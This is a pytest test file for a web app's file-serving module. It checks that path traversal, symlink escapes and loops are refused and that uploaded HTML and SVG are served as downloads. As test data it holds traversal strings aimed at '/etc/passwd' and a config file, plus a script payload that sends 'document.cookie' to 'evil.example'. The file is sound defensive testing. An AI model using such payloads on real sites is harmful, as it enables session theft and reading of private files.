import pytest

from scieflow.web import files


def test_resolve_accepts_a_file_inside_the_run(tmp_path):
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "x.md").write_text("hi")
    assert files.resolve(tmp_path, "a/x.md").name == "x.md"


@pytest.mark.parametrize("bad", ["../secrets.txt", "a/../../secrets.txt",
                                 "/etc/passwd", "a/../..", ""])
def test_resolve_refuses_anything_outside_the_run(tmp_path, bad):
    (tmp_path / "a").mkdir()
    (tmp_path.parent / "secrets.txt").write_text("nope")
    with pytest.raises(ValueError):
        files.resolve(tmp_path, bad)


def test_resolve_refuses_a_symlink_pointing_out(tmp_path):
    outside = tmp_path.parent / "outside.txt"
    outside.write_text("nope")
    (tmp_path / "link.txt").symlink_to(outside)
    with pytest.raises(ValueError):
        files.resolve(tmp_path, "link.txt")


def test_resolve_refuses_a_path_component_that_is_too_long(tmp_path):
    # Path.resolve() raises bare OSError (errno 36, "File name too long")
    # for this — not ValueError or FileNotFoundError. resolve() must not
    # let that reach the caller as an unhandled exception.
    with pytest.raises(ValueError):
        files.resolve(tmp_path, "x" * 5000)


def test_resolve_refuses_a_symlink_loop(tmp_path):
    # Path.resolve() raises bare RuntimeError for a symlink cycle.
    (tmp_path / "loop1").symlink_to(tmp_path / "loop2")
    (tmp_path / "loop2").symlink_to(tmp_path / "loop1")
    with pytest.raises(ValueError):
        files.resolve(tmp_path, "loop1/x")


def test_listing_sorts_directories_first(tmp_path):
    (tmp_path / "zdir").mkdir()
    (tmp_path / "a.md").write_text("x")
    names = [entry["name"] for entry in files.listing(tmp_path, "")]
    assert names == ["zdir", "a.md"]


def test_files_page_lists_the_run(client, project):
    ws = project.run_dir("r1")
    (ws / "iterations").mkdir(exist_ok=True)
    (ws / "iterations" / "hypothesis.md").write_text("# H1\n")
    body = client.get("/runs/r1/files").text
    assert "iterations" in body and "status.yml" in body


def test_text_file_is_shown_inline(client, project):
    (project.run_dir("r1") / "note.md").write_text("# a heading\n")
    body = client.get("/runs/r1/file", params={"path": "note.md"}).text
    assert "# a heading" in body


def test_binary_file_is_served_with_its_media_type(client, project):
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
    (project.run_dir("r1") / "figure.png").write_bytes(png)
    response = client.get("/runs/r1/file", params={"path": "figure.png"})
    assert response.status_code == 200
    assert response.headers["content-type"] == "image/png"
    assert response.content.startswith(b"\x89PNG")


def test_traversal_through_the_route_is_refused(client, project):
    (project.root / "config" / "agents.yml").exists()
    response = client.get("/runs/r1/file", params={"path": "../../config/agents.yml"})
    assert response.status_code == 400
    assert "escapes" in response.text


def test_missing_file_is_404(client):
    assert client.get("/runs/r1/file", params={"path": "nope.md"}).status_code == 404


def test_symlink_loop_through_the_route_is_400_not_500(client, project):
    ws = project.run_dir("r1")
    (ws / "loop1").symlink_to(ws / "loop2")
    (ws / "loop2").symlink_to(ws / "loop1")
    response = client.get("/runs/r1/file", params={"path": "loop1/x"})
    assert response.status_code == 400
    assert "escapes" in response.text


def test_html_artifact_cannot_execute_in_the_apps_origin(client, project):
    (project.run_dir("r1") / "evil.html").write_text(
        "<script>document.location='https://evil.example/'+document.cookie</script>")
    response = client.get("/runs/r1/file", params={"path": "evil.html"})
    assert response.status_code == 200
    assert response.headers["content-type"] != "text/html"
    assert "attachment" in response.headers.get("content-disposition", "")
    assert response.headers.get("x-content-type-options") == "nosniff"


def test_svg_artifact_is_not_rendered_inline(client, project):
    (project.run_dir("r1") / "figure.svg").write_text(
        "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>")
    response = client.get("/runs/r1/file", params={"path": "figure.svg"})
    assert response.status_code == 200
    assert response.headers["content-type"] != "image/svg+xml"
    assert "attachment" in response.headers.get("content-disposition", "")


def test_png_is_still_served_inline(client, project):
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
    (project.run_dir("r1") / "still.png").write_bytes(png)
    response = client.get("/runs/r1/file", params={"path": "still.png"})
    assert response.status_code == 200
    assert response.headers["content-type"] == "image/png"
    assert "attachment" not in response.headers.get("content-disposition", "")


def test_files_listing_urlencodes_special_characters_in_links(client, project):
    (project.run_dir("r1") / "a&b.md").write_text("x")
    body = client.get("/runs/r1/files").text
    assert "path=a%26b.md" in body
    assert "path=a&b.md" not in body


def test_encoded_link_for_a_special_character_filename_opens(client, project):
    (project.run_dir("r1") / "e+f.md").write_text("hello there")
    listing = client.get("/runs/r1/files").text
    assert "path=e%2Bf.md" in listing
    response = client.get("/runs/r1/file", params={"path": "e+f.md"})
    assert response.status_code == 200
    assert "hello there" in response.text
